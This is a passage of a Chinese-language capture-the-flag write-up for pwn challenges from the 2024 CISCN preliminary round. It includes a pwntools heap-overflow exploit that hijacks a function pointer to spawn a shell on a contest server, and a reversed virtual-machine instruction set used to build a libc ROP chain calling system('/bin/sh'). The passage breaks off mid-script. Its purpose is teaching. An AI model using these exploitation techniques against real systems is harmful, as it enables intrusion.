+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185705572.png"
+                      class=""
+                >
+
+<p>然后看看edit一些参数的限制，其中长度最多为40，但这个长度已经足以进行堆溢出，覆盖到下一个chunk的data域了，那么就可以直接把函数指针给改了。这里的函数指针是二级指针，所以还不能直接填进去backdoor函数的地址，由于gift给了堆上的地址了，那么我们就能先在堆的某个位置填入backdoor地址，然后劫持的函数指针指向该地址处。最后edit触发一下，然后就有shell了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185800640.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215190233099.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215201646774.png"
+                      class=""
+                >
+
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./note&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.95.214.102&quot;</span>,<span class="number">20609</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">backdoor = <span class="number">0x80489CE</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():       <span class="comment">#max 9</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):     <span class="comment">#size&lt;40,触发函数指针</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;len&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">9</span>),<span class="number">16</span>)-<span class="number">0x5fc8</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base: &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">28</span>,p32(backdoor)*<span class="number">5</span>+p32(<span class="number">0x21</span>)+p32(heap_base+<span class="number">0x5fd0</span>))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">10</span>,<span class="string">b&quot;abcd&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>flag值</strong></p>
+<p>flag{2fee0fed-0283-497c-9a38-05aceb984b96}</p>
+<h4 id="pwn-avm"><a href="#pwn-avm" class="headerlink" title="pwn-avm"></a>pwn-avm</h4><p>VMpwn，首先要逆出其中每个指令的含义，以及自定义指令的构成。</p>
+<p>首先主函数可以读取0x300字节的输入，然后进initial函数进行初始化。具体是往opt+0x100地址之后填一些控制信息，然后再把前面的位置都置空。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215190920906.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215191043445.png"
+                      class=""
+                >
+
+<p>经过动态调试，最后逆出的opt结构大概是这样，0x108处存我们的输入，也就是具体的指令，0x100处存目前指令的偏移（从后面动调看出），0x110处存最大的指令偏移。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215191015846.png"
+                      class=""
+                >
+
+<p>然后看最重要的parse函数，首先v2里存了我们的选项，后面函数表中总共有10种不同的指令，注意到这里最后向右移位了0x1C，所以我们实际的指令种类是存在左移位0x1C处的。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192127742.png"
+                      class=""
+                >
+
+<p>第一个函数如下：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192643849.png"
+                      class=""
+                >
+
+<p>第二个函数如下:</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192712698.png"
+                      class=""
+                >
+
+<p>第三个函数如下：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192739108.png"
+                      class=""
+                >
+
+<p>看了三个具体指令的实现，我们观察到只有最后赋值后面的运算符发生了变化，然后我们就可以猜测其具体就是分别实现了add，sub，mul的功能，以此类推，就能得到前八个函数的大体作用。这里其实我们能看到opt前面0x100个字节分成了32个8字节，分别模拟了32个寄存器，我们的内容都是存在模拟寄存器中，前面8个函数也都只能对模拟寄存器做操作。实际上由于前面把这0x100个字节置空，所以直接调用前面这8个指令，得到的结果永远都是0。还有一点就是发现每个指令都会把opt偏移0x100处累加四，这说明每个指令都占用四个字节长度（逻辑上如此，而实际上后面分析也的确如此）。我们最多可以连续写0x300&#x2F;0x4&#x3D;0xc0个指令。</p>
+<p>第9个和第10个函数稍微有点不同：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215193045374.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215193103501.png"
+                      class=""
+                >
+
+<p>直接看有点摸不着头脑，只知道a2是一个栈上的缓冲区，我们后面动态调试的时候就会发现，这里第9个实际上能够往该缓冲区中写一个前面模拟寄存器的值，其偏移最多为0xFFF；而第十个函数可以从缓冲区偏移最多0xFFF处，读取一个值到我们的模拟寄存器。这里的<code>(HIWORD(v3) &amp; 0xFFF)</code>实际上相当于一个立即数，代表偏移。之后我们的指令表大概就恢复完成了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192212512.png"
+                      class=""
+                >
+
+<p>下一个问题是指令的具体组成，比如我们想用write_reg往偏移为25的模拟寄存器存缓冲区偏移0xd38的内容，那么我们可以在汇编的具体执行过程中进行分析。逐渐调试就能得到<code>payload = p32((10&lt;&lt;0x1c)+(tarreg&amp;0x1f)+((reg1&amp;0x1f)&lt;&lt;5)+((num&amp;0xfff)&lt;&lt;16))</code>。也就是说指令类型左移位0x1c，存储结果寄存器在最低位（且不超过31），一个被当作偏移的寄存器序号在左移位5位处，立即数在左移位16位处。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215194053168.png"
+                      class=""
+                >
+
+<p>然后就能还原出每一个指令的组成结构：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">1</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">2</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">3</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">4</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">5</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">6</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">7</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">8</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_stack</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">    payload = p32((<span class="number">9</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">     payload = p32((<span class="number">10</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>之后的问题就是要从栈上已有的固定的内容，读取到模拟寄存器中，这里我们在动态调试时，能够看到缓冲区的起始地址，也就是加上我们的立即数偏移这个位置。这里如果我们最后所有指令结束后，parse函数返回时，就会到偏移0x118位置。我们想要算出gadget和system等相关于libc的地址，所以要获取libc基址。这里能在0xd38偏移位置找到，而且这个是前面栈帧所遗留的，不会在每次程序执行时变化。同时我们还能在这个libc相关地址上面获取到一个1，将他们存到模拟寄存器中。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215195205194.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215195328605.png"
+                      class=""
+                >
+
+<p>后面就是要先算出libc基址，然后得到ret，pop_rdi_ret，&#x2F;bin&#x2F;sh字符串以及system的地址。这里直接自己找栈上的内容，然后一点一点手动构造出来显然不是很现实。然后发现距离libc_base偏移最多的&#x2F;bin&#x2F;sh字符串地址的偏移为0x1d8678。换算成二进制，大概要用21个二进制位，不过我们模拟寄存器位充足，最后我用寄存器模拟了23个二进制位。这样我们可以用模拟寄存器的线性组合表示出任何我们想要的偏移。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215200035859.png"
+                      class=""
+                >
+
+<p>具体组合实现：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_addr</span>(<span class="params">offset,tar</span>):</span><br><span class="line">    binary = <span class="built_in">bin</span>(offset)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    payload = add(tar,<span class="number">31</span>,<span class="number">31</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)):</span><br><span class="line">        <span class="keyword">if</span> binary[i]==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            payload += add(tar,tar,i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload =  write_reg(<span class="number">25</span>,<span class="number">0</span>,<span class="number">0xd38</span>) + write_reg(<span class="number">0</span>,<span class="number">31</span>,<span class="number">0xd30</span>)+add(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)+add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)+add(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)+add(<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>)+add(<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>)+add(<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">payload += add(<span class="number">7</span>,<span class="number">6</span>,<span class="number">6</span>)+add(<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>)+add(<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>)+add(<span class="number">10</span>,<span class="number">9</span>,<span class="number">9</span>)+add(<span class="number">11</span>,<span class="number">10</span>,<span class="number">10</span>)+add(<span class="number">12</span>,<span class="number">11</span>,<span class="number">11</span>)+add(<span class="number">13</span>,<span class="number">12</span>,<span class="number">12</span>)+add(<span class="number">14</span>,<span class="number">13</span>,<span class="number">13</span>)+add(<span class="number">15</span>,<span class="number">14</span>,<span class="number">14</span>)</span><br><span class="line">payload += add(<span class="number">16</span>,<span class="number">15</span>,<span class="number">15</span>)+add(<span class="number">17</span>,<span class="number">16</span>,<span class="number">16</span>)+add(<span class="number">18</span>,<span class="number">17</span>,<span class="number">17</span>)+add(<span class="number">19</span>,<span class="number">18</span>,<span class="number">18</span>)+add(<span class="number">20</span>,<span class="number">19</span>,<span class="number">19</span>)+add(<span class="number">21</span>,<span class="number">20</span>,<span class="number">20</span>)+add(<span class="number">22</span>,<span class="number">21</span>,<span class="number">21</span>)+add(<span class="number">23</span>,<span class="number">22</span>,<span class="number">22</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29d90</span>,<span class="number">24</span>)</span><br><span class="line">payload += sub(<span class="number">25</span>,<span class="number">25</span>,<span class="number">24</span>)		<span class="comment">#get libc_base，saved in 25</span></span><br><span class="line">payload += make_addr(<span class="number">0x29139</span>,<span class="number">24</span>) + add(<span class="number">29</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">29</span>,<span class="number">31</span>,<span class="number">0x118</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x2a3e5</span>,<span class="number">24</span>) + add(<span class="number">26</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">26</span>,<span class="number">31</span>,<span class="number">0x120</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x1d8678</span>,<span class="number">24</span>) + add(<span class="number">27</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">27</span>,<span class="number">31</span>,<span class="number">0x128</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x50D70</span>,<span class="number">24</span>) + add(<span class="number">28</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">28</span>,<span class="number">31</span>,<span class="number">0x130</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>基本动态调试能正确算出一个偏移，那么其它的也就没问题了，这里我往25号模拟寄存器存libc_base，24号模拟寄存器存偏移。直接往返回地址处写rop链。最后也是只用了0x150字节，离0x300字节的上限还远。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215201820964.png"
+                      class=""
+                >
+
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"><span class="comment"># 0x300大小限制</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    len    func</span></span><br><span class="line"><span class="comment"># 1   4      add</span></span><br><span class="line"><span class="comment"># 2   4      sub</span></span><br><span class="line"><span class="comment"># 3   4      mul</span></span><br><span class="line"><span class="comment"># 4   4      div</span></span><br><span class="line"><span class="comment"># 5   4      xor</span></span><br><span class="line"><span class="comment"># 6   4      and</span></span><br><span class="line"><span class="comment"># 7   4      shl</span></span><br><span class="line"><span class="comment"># 8   4      shr</span></span><br><span class="line"><span class="comment"># 9   4     write_stack</span></span><br><span class="line"><span class="comment"># 10  4     write_reg</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">1</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">2</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">3</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span 